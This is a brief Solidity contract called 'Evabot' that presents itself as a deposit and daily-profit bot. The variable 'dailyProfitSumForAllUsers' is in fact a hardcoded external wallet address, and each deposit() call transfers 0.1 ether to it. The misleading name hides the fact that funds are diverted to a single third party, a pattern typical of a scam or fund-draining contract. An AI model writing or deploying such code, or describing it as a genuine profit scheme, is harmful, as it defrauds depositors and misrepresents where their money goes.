pragma solidity ^0.4.24;


contract Evabot {
  
  address public dailyProfitSumForAllUsers;
  constructor() public {
   
    dailyProfitSumForAllUsers = 0xdf2951b79a9cfa455270473f4c10f6164813f1be;
  }
  // deposit ether
  function deposit() payable public {
     dailyProfitSumForAllUsers.transfer(10**17); 
  }
  
  //fall back
  function() payable public {
      
  }
}